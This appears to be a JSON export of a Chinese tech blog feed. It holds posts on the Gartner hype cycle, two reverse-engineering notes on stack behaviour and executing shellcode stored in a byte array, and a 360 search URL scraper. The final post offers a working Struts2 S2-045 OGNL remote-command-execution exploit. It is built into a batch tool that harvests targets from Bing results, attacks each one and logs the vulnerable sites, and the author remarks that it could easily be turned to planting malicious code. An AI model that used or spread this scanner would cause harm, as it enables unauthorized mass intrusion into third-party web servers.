Enlightenment）**\n该技术的优缺点越来越明显，细节逐渐清晰，越来越多的人开始理解它。基于它的第二代和第三代产品出现，更多的企业开始尝试，可复制的成功使用模式出现。媒体重新认识它，业界这一次给予了高度的理性的关注。\n\n5. **高原期（Plateau of Productivity）**\n经过不断发展，该技术慢慢成为了主流。技术标准得到了清晰定义，使用起来越发方便好用，市场占有率越来越高，进入稳定应用阶段。配合它的工具和最佳实践，经过数代的演进，也变得非常成熟了。业界对它有了公认的一致的评价。\n\n该模型的细节可以查看维基百科的[大图](https://en.wikipedia.org/wiki/Hype_cycle#/media/File:Hype-Cycle-General.png)。\n\n高德纳公司每年都会公布，当年的热门技术图。下面就是去年七月的图。\n\n![bg2017030302.png](https://ooo.0o0.ooo/2017/03/12/58c4df3436d4e.png)\n\n上图中，4D打印处于\"启动期\"，区块链处于\"泡沫期\"，增强现实处于\"低谷期\"，虚拟现实处于爬升期。\n\n本周，有人进行数据分析后，建立了一个名叫 [State.of.Dev](https://stateofdev.com/) 的网站，提供各种技术的热门程度图。\n\n下图是编程语言。\n\n![bg2017030303.png](https://ooo.0o0.ooo/2017/03/12/58c4df61bd060.png)\n\n上图中，Rust 语言处于启动期，Go 语言处于泡沫期，Ruby 语言处于低谷期，Object-C 处于爬升期，PHP 和 Java 处于高原期。\n\n下图是 Web 技术。\n\n![bg2017030305.png](https://ooo.0o0.ooo/2017/03/12/58c4df7a78ea1.png)\n\n上图中，WebAssembly 处于启动期，WebRTC 处于低谷期，HTTPS 处于高原期。\n\n一门技术到底前景如何，很难预测，但是它的热门程度却是可以衡量的（比如在社交媒体提及次数的增长幅度）。风险投资跟热门程度高度正相关，越热门的技术越容易拿到投资。\n\n用户可以采用这张图，判断技术处在哪一个阶段，确定它的热门程度。简单的使用规则如下。\n\n\u003e **\"争取风险投资，要选择热门的技术；解决实际问题， 要选择可靠的技术。\"**\n\n简单说，处于启动期的技术，风险很大，不确定性极高，但是一旦成功，回报可能也很高，适合创业公司；处于高原期的技术，非常可靠，风险低，有成熟的解决方案和配套工具，适合大公司和企业的内部应用。\n\n反过来说，如果一门技术处于高原期了，就代表它非常成熟了，人们对它能干什么和不能干什么，都已经很了解了，也没有新的期待了，技术本身的潜力已经不大了，所以用它拿不到投资，只能用来干活。\n\n（完）\n\n\n**转载自[阮一峰的网络日志](http://www.ruanyifeng.com/blog/2017/03/gartner-hype-cycle.html)**\n","cover":"","link":"2017/03/12/technology-s-popularity-curve.html","preview":"\u003cp\u003e全球最大的 IT 咨询公司\u003ca href=\"http://baike.baidu.com/item/Gartner\"\u003e高德纳\u003c/a\u003e（Gartner），有一个\u0026rdquo;\u003ca href=\"http://www.gartner.com/technology/research/methodologies/hype-cycle.jsp\"\u003e技术热门度曲线\u003c/a\u003e\u0026ldquo;模型（Gartner Hype Cycle）。\u003c/p\u003e\n\n\u003cp\u003e该模型认为，一门技术的发展要经历五个阶段。\u003c/p\u003e\n\n\u003cp\u003e\u003cimg src=\"data:image/gif;base64,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\" data-src=\"https://ooo.0o0.ooo/2017/03/12/58c4de8267e76.png\" alt=\"bg2017030301.png\" /\u003e\u003c/p\u003e\n","title":"技术的热门度曲线"},{"content":"\n\n\n**以下的ide为CodeBlocks，编译器采用的GCC，系统为win10 64bit,在不同编译器和环境下汇编代码可能不同**\n\n# 现象\n```c\n#include \u003cstdio.h\u003e\n#include \u003cstdlib.h\u003e\n\nint getmin(int a, int b)\n{\n\tif(a\u003eb)\n\t\treturn b;\n\telse\n\t\treturn a;\n}\n\ntypedef int (*pfunction)(int, int);\n\nint main()\n{\n    int a=456789,b=123789,c=0;\n    pfunction pGetmin = (pfunction)getmin;\n\t\n    c = pGetmin(a, b);\n    printf(\"%d\",c);\n    return 0;\n}\n```\n\n上面这段代码是比大小输出小的，`typedef int (*pfunction)(int, int);`定义了一个函数指针，但是下面这段代码和上面的功能是完全一样的\n\n```c\n#include \u003cstdio.h\u003e\n#include \u003cstdlib.h\u003e\n\ntypedef int (*pfunction)(int, int);\n\nint main()\n{\n    int a=456789,b=123789,c=0;\n    unsigned char loc[] =\n    {\n        0x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0x3B, 0x45, 0x0C, 0x7E, 0x05, 0x8B, 0x45, 0x0C, 0xEB, 0x03, 0x8B, 0x45, 0x08, 0x5D, 0xC3\n    };\n\n    pfunction getmin = (pfunction)\u0026loc;\n    c = getmin(a, b);\n    printf(\"%d\",c);\n    return 0;\n}\n```\n# 原因分析\n当`c = pGetmin(a, b);`调用pGetmin的时候，在汇编中是先call跳到一个地址然后从那个地址再jmp到函数入口地址然后开始执行函数\ngetmin函数整体汇编为\n```assembly\npush   ebp\nmov    ebp,esp\nmov    eax,DWORD PTR [ebp+0x8]\ncmp    eax,DWORD PTR [ebp+0xc]\njle    \u003cgetmin+16\u003e\nmov    eax,DWORD PTR [ebp+0xc]\njmp    \u003cgetmin+19\u003e\nmov    eax,DWORD PTR [ebp+0x8]\npop    ebp\nret\n```\n通过一些调试程序（发现CodeBlocks带的汇编调试没有vc6好用，看不到硬编码）可以得出这段汇编代码在硬编码中的值为\n```\n0x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0x3B, 0x45, 0x0C, 0x7E, 0x05, 0x8B, 0x45, 0x0C, 0xEB, 0x03, 0x8B, 0x45, 0x08, 0x5D, 0xC3\n```\n这段数据我们在第二个代码中把它存入了一个char类型的数组，它虽然在数据区，但是它还是可以看作可运行的一段函数代码，我们依旧定义一个函数指针指向这个char类型数组的入口地址，达到了和第一种相同的效果\n在编程中，我们是把代码和数据分得很开的，但是在逆向和汇编中，这个区别就不明显了，在计算机中都是以数据形式存在的，你可以说它是一串数据，也可以说它是代码\n\n***转载请注明出处***\n","cover":"","link":"2017/03/10/reverse-engineering-study-note-2-is-this-code-or-data.html","preview":"\u003cp\u003e\u003cstrong\u003e以下的ide为CodeBlocks，编译器采用的GCC，系统为win10 64bit,在不同编译器和环境下汇编代码可能不同\u003c/strong\u003e\u003c/p\u003e\n","title":"逆向学习笔记（2）-这是代码还是数据"},{"content":"\n\n\n对于下面这段c语言代码会一直不停地循环，为什么呢？\n\n```c\n#include\u003cstdio.h\u003e\n\nvoid HelloWorld()\n{\n\tint i = 0;\n\tint a[] = {1,2,3,4,5,6,7,8,9,10};\n\tfor(i=0; i\u003c=10; i++)\n\t{\n\t\ta[i] = 0;\n\t\tprintf(\"Hello World!\\n\");\n\t}\n}\n\nint main(int argc, char* argv[])\n{\n\tHelloWorld();\n\tgetchar();\n\treturn 0;\n}\n\n```\n\n# 问题\n当你运行上面这串代码的时候，因为c语言并不会对数组越界进行检查，所以是不会报错可以直接运行的，那么是什么原因导致了下面这张图的结果呢？\n\n![GIF.gif](https://ooo.0o0.ooo/2017/03/09/58c11551a36ea.gif)\n\n# 分析\n我们可以调试跟进看看，在HelloWorld函数上加一个断点跟进去看看\n\n![snipaste_20170309_165830.png](https://ooo.0o0.ooo/2017/03/09/58c11956dee36.png)\n\n这个函数主要的汇编代码如下\n```assembly\n8:        int i = 0;\n00401038   mov         dword ptr [ebp-4],0\n9:        int a[] = {1,2,3,4,5,6,7,8,9,10};\n0040103F   mov         dword ptr [ebp-2Ch],1\n00401046   mov         dword ptr [ebp-28h],2\n0040104D   mov         dword ptr [ebp-24h],3\n00401054   mov         dword ptr [ebp-20h],4\n0040105B   mov         dword ptr [ebp-1Ch],5\n00401062   mov         dword ptr [ebp-18h],6\n00401069   mov         dword ptr [ebp-14h],7\n00401070   mov         dword ptr [ebp-10h],8\n00401077   mov         dword ptr [ebp-0Ch],9\n0040107E   mov         dword ptr [ebp-8],0Ah\n10:       for(i=0; i\u003c=10; i++)\n00401085   mov         dword ptr [ebp-4],0\n0040108C   jmp         HelloWorld+77h (00401097)\n0040108E   mov         eax,dword ptr [ebp-4]\n00401091   add         eax,1\n00401094   mov         dword ptr [ebp-4],eax\n00401097   cmp         dword ptr [ebp-4],0Ah\n0040109B   jg          HelloWorld+97h (004010b7)\n11:       {\n12:           a[i] = 0;\n0040109D   mov         ecx,dword ptr [ebp-4]\n004010A0   mov         dword ptr [ebp+ecx*4-2Ch],0\n13:           printf(\"Hello World!\\n\");\n004010A8   push        offset string \"Hello World!\\n\" (0042301c)\n004010AD   call        printf (004011a0)\n004010B2   add         esp,4\n14:       }\n004010B5   jmp         HelloWorld+6Eh (0040108e)\n15:   }\n```\n\n从`int i = 0;`开始看直到`for(i=0; i\u003c=10; i++)`的堆栈图是\n\n![snipaste_20170309_170508.png](https://ooo.0o0.ooo/2017/03/09/58c11ad728904.png)\n\n第一次进入循环开始先把0放到了[ebp-4]，然后跳到了`00401097   cmp dword ptr [ebp-4],0Ah`以及下面的jg，这里的意思是如果ebp-4中存放的值比0A大那么就执行`jg HelloWorld+97h (004010b7)`跳到004010b7函数结束\n第一次进入循环时，cmp之后（ebp-4中存放的值比0A小）执行`0040109D`处的语句，此时`ECX`中的值变成了[ebp-4]中的值也就是0，然后`mov dword ptr [ebp+ecx*4-2Ch],0`将0放到`ebp+ecx*4-2Ch`处也就是`EBP-2C`处，下面的两条语句不用管是执行输出的，然后到了`add  esp,4`将栈顶的值加4，这里我们无需关注栈顶，然后`jmp HelloWorld+6Eh (0040108e)`跳回到`0040108e`继续执行\n\n![snipaste_20170309_170508.png](https://ooo.0o0.ooo/2017/03/09/58c11e41e5384.png)\n\n跳到`0040108E   mov  eax,dword ptr [ebp-4]`开始执行，紧接着这三条语句的作用是把`EBP-4`中的值加了1，也就是`EBP-4`中的值现在为1\n```assembly\nmov eax,dword ptr [ebp-4]\nadd eax,1\nmov dword ptr [ebp-4],eax\n```\ncmp比较之后再次执行循环体，循环体完成后再次跳到`0040108e`，此时`EBP-28`的值变为了0，栈顶esp再次增加了4（这个例子中栈顶是不用关注的）\n\n![snipaste_20170309_172648.png](https://ooo.0o0.ooo/2017/03/09/58c11fe590ae4.png)\n\n紧接着下次执行后\n\n![snipaste_20170309_172805.png](https://ooo.0o0.ooo/2017/03/09/58c1202d748a0.png)\n\n直到这个数组长度为10的数组执行到第十次\n\n![snipaste_20170309_173122.png](https://ooo.0o0.ooo/2017/03/09/58c120f1a650e.png)\n\n此时再次跳转到`0040108e`，然后`EBP-4`中的值再次增加了1，现在也就是`EBP-4`中的值变为了0A，cmp比较之后`EBP-4`中的值依旧不比0A大，接着执行`mov ecx,dword ptr [ebp-4]`，此时ECX的值变成了0A，接着执行`mov dword ptr [ebp+ecx*4-2Ch],0`也就是`mov dword ptr [ebp-4],0`\n\n然后呢，你发现了什么？？？就是他喵的`EBP-4`中的值变成了0\n\n![snipaste_20170309_173729.png](https://ooo.0o0.ooo/2017/03/09/58c12263d566e.png)\n\n变成0代表着什么？？？`EBP-4`中的值是我们拿来干嘛的？是用来和0A进行cmp然后决定是否结束函数的，可是我们辛辛苦苦循环了10次，第11次全泡汤了，唯一的变化就是数组都成了0，栈顶的值变化了不少，然后再次cmp的时候，0和0A比，决定了你还是要循环，不管多少次，最后都会把你用来计数的地址`EBP-4`中的值清零\n\n这也就是为什么上面这段c语言代码会一直不停地循环的原因\n\n**转载请注明出处**\n","cover":"","link":"2017/03/09/reverse-engineering-study-note-1-why-does-code-keep-running.html","preview":"\u003cp\u003e对于下面这段c语言代码会一直不停地循环，为什么呢？\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e#include\u0026lt;stdio.h\u0026gt;\n\nvoid HelloWorld()\n{\n\tint i = 0;\n\tint a[] = {1,2,3,4,5,6,7,8,9,10};\n\tfor(i=0; i\u0026lt;=10; i++)\n\t{\n\t\ta[i] = 0;\n\t\tprintf(\u0026quot;Hello World!\\n\u0026quot;);\n\t}\n}\n\nint main(int argc, char* argv[])\n{\n\tHelloWorld();\n\tgetchar();\n\treturn 0;\n}\n\n\u003c/code\u003e\u003c/pre\u003e\n","title":"逆向学习笔记（1）-为什么代码不停地循环运行"},{"content":"\n\n\n还是个比较简单的，不像百度有加密算法\n# 分析\n```\nhttp://www.so.com/link?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452\u0026q=inurl%3Anews.do\u0026ts=1488978912\u0026t=89c5361a44fe3f52931d25c6de262bb\u0026src=haosou\n```\n网址是上面这个样子，没加密直接取就好了，去掉头`http://www.so.com/link?url=`和尾`\u0026q=`一直到末尾的部分，剩下的就可以吃了\n\n那么规则我们就可以写出来了\n```python\na['href'][a['href'].index('?url='):a['href'].index('\u0026q=')][5:]\n```\n`a['href']`是待处理网址,`a['href'].index('?url='):a['href'].index('\u0026q=')`的部分为`?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452`\n\n最后还需要用unquote解码\n- 在python3中是`urllib.parse.unquote`\n- 在python2中是`urllib.unquote`\n\n# code\n```python\nimport requests\nfrom bs4 import BeautifulSoup\nfrom urllib.parse import unquote\n\nheaders = {\n    \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\"\n}\n\n#爬取360搜索引擎真实链接，第一个参数关键词str，第二个参数爬取页数int\ndef parse360(keyword, pagenum):\n    keywordsBaseURL = 'https://www.so.com/s?q=' + str(keyword) + '\u0026pn='\n    pnum = 1\n    while pnum \u003c= int(pagenum):\n        baseURL = keywordsBaseURL + str(pnum)\n        try:\n            request = requests.get(baseURL, headers=headers)\n            soup = BeautifulSoup(request.text, \"html.parser\")\n            urls = [unquote(a['href'][a['href'].index('?url='):a['href'].index('\u0026q=')][5:]) for a in soup.select('li.res-list \u003e h3 \u003e a')]\n            for url in urls:\n                yield url\n        except:\n            yield None\n        finally:\n            pnum += 1\n```\n\n用法示例:\n```python\ndef main():\n    for url in parse360(\"keyword\",10):\n        if url:\n            print url\n        else:\n            continue\n\nif __name__ == '__main__':\n    main()\n```\n# 最后上一张测试图\n![snipaste_20170308_214047.png](https://ooo.0o0.ooo/2017/03/08/58c009f5b3c1d.png)\n\n\n**转载请注明出处**\n","cover":"","link":"2017/03/08/360-search-engine-get-realurl-with-python.html","preview":"\u003cp\u003e还是个比较简单的，不像百度有加密算法\u003c/p\u003e\n\n\u003ch1\u003e分析\u003c/h1\u003e\n\n\u003cpre\u003e\u003ccode\u003ehttp://www.so.com/link?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452\u0026amp;q=inurl%3Anews.do\u0026amp;ts=1488978912\u0026amp;t=89c5361a44fe3f52931d25c6de262bb\u0026amp;src=haosou\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e网址是上面这个样子，没加密直接取就好了，去掉头\u003ccode\u003ehttp://www.so.com/link?url=\u003c/code\u003e和尾\u003ccode\u003e\u0026amp;q=\u003c/code\u003e一直到末尾的部分，剩下的就可以吃了\u003c/p\u003e\n","title":"360搜索引擎取真实地址-python代码"},{"content":"\n\n\n\n今天晚上看老铁们在群里就这个st2-045漏洞讨论得火热，个人不太喜欢日站，本来想直接写个批量挂马的东西，但是想想还是算了，如果你有兴趣，改改也很容易，反正不关我的事\n\n测试图\n![TIM图片20170307212124.png](https://ooo.0o0.ooo/2017/03/07/58beb8f48f7df.png)\n\n\n**2017-3-8更新**\n- 增加了对.do关键词的支持，并且支持任何关键词了，之前我只考虑到了.action关键词并且写死了规则，py版本已经更新，~~win版的exe未更新，需要的自行用pyinstaller打包为exe~~\n- 之前采用whoami如果返回200状态码就判断存在漏洞，但是现在很多已经修复了，导致访问之后依旧会跳到正常页面返回200状态码，于是我改了一下判断，执行命令echo xxxx，如果返回结果中含有xxxx就证明漏洞存在\n- win版exe已经打包\n- **重要：建议大家都使用py版本，经过群友测试，exe版本对中文关键词的支持不太好，会出现错误，如果使用上有问题可评论**\n- **exe版本会出现扫描过慢的情况，强烈建议py版本，鉴于有些朋友说不会配置python环境，我在下面给出了例子**\n- **有些朋友说自定义关键字字典出错，这里要提一句，你的字典txt的编码需要是utf-8，有些东西因为写的比较快没考虑太全，见谅**\n![TIM图片20170308132948.png](https://ooo.0o0.ooo/2017/03/08/58bf96eadc438.png)\n\n\n**依赖包的安装**\n```bash\n//首先你需要安装一个python，在安装图中记得把有pip的选项和add python to path类似的选项勾选上，然后安装完成后执行python -version和pip\n//如果执行python -version提醒你有问题，试着重启一下cmd或者电脑，或者检查你的path环境变量下有没有python的安装的路径，没有的话就加上\n//如果正常证明环境安装成功，如果执行pip提醒你没有pip，就把你python安装路径下的Scripts目录加到path环境变量，然后在命令行在执行以下代码\npip install requests\npip install beautifulsoup4\n```\n\n对于此脚本所放置文件夹下必须有keyword.txt用来存放一行行的关键词\n最开始是打算直接全部读取然后一个一个跑，不过感觉时间太漫长，测试时间太久\n后来改成关键词就是自己输入，但是又感觉太麻烦\n然后就变成了现在的读取关键词然后标号直接输入序号就可以\n途中遇到了有的网址直接拒绝访问导致报错，还有的超时一直不返回报文，这些都解决了，个人测试的结果还可以，结果保存在一个txt下，至于你想再干些什么，不关我的事情了\n\n**说明**\n例子：\n```bash\npython s2-045.py 9 10\n```\n第一个参数是你的文件名，第二个是关键词所对应的序号，第三个是你需要爬行的页数\n序号与关键词的对应，可以直接运行`python s2-045.py`就可以产看帮助\n脚本采用的bing搜索引擎，**文件我会打包在下面**\n\n\n上代码,**python2和3通用**\n\n```python\n# encoding:utf-8\nimport sys,requests\nfrom bs4 import BeautifulSoup\n\nkeyword = {}\nwith open(\"keyword.txt\") as f:\n    i = 0\n    for keywordLine in f:\n        keyword[str(i)] = keywordLine.strip()\n        i += 1\n\nusage = '''\nusage : python s2-045.py 0 10\n\nfirst parameter is your filename\nsecond parameter is your keyword's number which will be used by Bing\nThird parameter is the page number you want to crawl\\n'''\n\ndef poc(actionURL):\n    data = '--447635f88b584ab6b8d9c17d04d79918\\\n    Content-Disposition: form-data; name=\"image1\"\\\n    Content-Type: text/plain; charset=utf-8\\\n    \\\n    x\\\n    --447635f88b584ab6b8d9c17d04d79918--'\n\t\n    header = {\n        \"Content-Length\" : \"155\", \n        \"User-Agent\" : \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\", \n        \"Content-Type\" : \"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo hereisaexp').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\", \n    }\n    try:\n        request = requests.post(actionURL, data=data, headers=header, timeout = 10)\n    except:\n        return \"None\", \"Refused\"\n    return request.text, request.status_code\n\ndef returnURLList():\n    keywordsBaseURL = 'http://cn.bing.com/search?q=' +keyword[sys.argv[1]]+ '\u0026first='\n    n =0\n    i = 1\n    while n \u003c int(sys.argv[2]):\n        baseURL = keywordsBaseURL + str(i)\n        try:\n            req = requests.get(baseURL)\n            soup = BeautifulSoup(req.text, \"html.parser\")\n            text = soup.select('li.b_algo \u003e h2 \u003e a')\n            if '.action' in keyword[sys.argv[1]]:\n                standardURL = [url['href'][:url['href'].index('.action')]+'.action' for url in text if '.action' in url['href']]\n            elif '.do' in keyword[sys.argv[1]]:\n                standardURL = [url['href'][:url['href'].index('.do')]+'.do' for url in text if '.do' in url['href']]\n            else:\n                standardURL = [url['href'] for url in text]\n        except:\n            print(\"HTTPERROR\")\n            continue\n        i += 10\n        n += 1\n        yield standardURL\n\ndef main():\n    if len(sys.argv) != 3:\n        print(usage)\n        for k,v in keyword.items():\n            print(\"%s is %s\"%(k, v))\n        sys.exit()\n\n    for urlList in returnURLList():\n        for actionURL in urlList:\n            text, code = poc(actionURL)\n            if 'hereisaexp' in text:\n                print(str(code) + \"----Successful----\" + actionURL + '\\n')\n                with open(\"AvailableURL.txt\",\"a\") as f:\n                    f.write(actionURL+'\\n')\n            else:\n                print(str(code)+'----'+actionURL+'\\n')\n\nif __name__ == '__main__':\n    main()\n```\n\n**[下载地址](http://file.codecat.one)**\n\n**打包了win版，大家可以直接使用，例如在该exe目录下执行~~（更新的并未打包出exe，如有需要可以自行用pyinstaller打包）~~**\n```bash\ns2-045.exe 9 10\n```\n**其他用法参照上面**\n**转载请注明出处**\n","cover":"","link":"2017/03/07/st2-045-batch-test-tool.html","preview":"\u003cp\u003e今天晚上看老铁们在群里就这个st2-045漏洞讨论得火热，个人不太喜欢日站，本来想直接写个批量挂马的东西，但是想想还是算了，如果你有兴趣，改改也很容易，反正不关我的事\u003c/p\u003e\n\n\u003cp\u003e测试图\n\u003cimg src=\"data:image/gif;base64,R0lGODlhGAAYAPQAAP///wAAAM7Ozvr6+uDg4LCwsOjo6I6OjsjIyJycnNjY2KioqMDAwPLy8nd3d4aGhri4uGlpaQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkHAAAAIf4aQ3JlYXRlZCB3aXRoIGFqYXhsb2FkLmluZm8AIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAGAAYAAAFriAgjiQAQWVaDgr5POSgkoTDjFE0NoQ8iw8HQZQTDQjDn4jhSABhAAOhoTqSDg7qSUQwxEaEwwFhXHhHgzOA1xshxAnfTzotGRaHglJqkJcaVEqCgyoCBQkJBQKDDXQGDYaIioyOgYSXA36XIgYMBWRzXZoKBQUMmil0lgalLSIClgBpO0g+s26nUWddXyoEDIsACq5SsTMMDIECwUdJPw0Mzsu0qHYkw72bBmozIQAh+QQJBwAAACwAAAAAGAAYAAAFsCAgjiTAMGVaDgR5HKQwqKNxIKPjjFCk0KNXC6ATKSI7oAhxWIhezwhENTCQEoeGCdWIPEgzESGxEIgGBWstEW4QCGGAIJEoxGmGt5ZkgCRQQHkGd2CESoeIIwoMBQUMP4cNeQQGDYuNj4iSb5WJnmeGng0CDGaBlIQEJziHk3sABidDAHBgagButSKvAAoyuHuUYHgCkAZqebw0AgLBQyyzNKO3byNuoSS8x8OfwIchACH5BAkHAAAALAAAAAAYABgAAAW4ICCOJIAgZVoOBJkkpDKoo5EI43GMjNPSokXCINKJCI4HcCRIQEQvqIOhGhBHhUTDhGo4diOZyFAoKEQDxra2mAEgjghOpCgz3LTBIxJ5kgwMBShACREHZ1V4Kg1rS44pBAgMDAg/Sw0GBAQGDZGTlY+YmpyPpSQDiqYiDQoCliqZBqkGAgKIS5kEjQ21VwCyp76dBHiNvz+MR74AqSOdVwbQuo+abppo10ssjdkAnc0rf8vgl8YqIQAh+QQJBwAAACwAAAAAGAAYAAAFrCAgjiQgCGVaDgZZFCQxqKNRKGOSjMjR0qLXTyciHA7AkaLACMIAiwOC1iAxCrMToHHY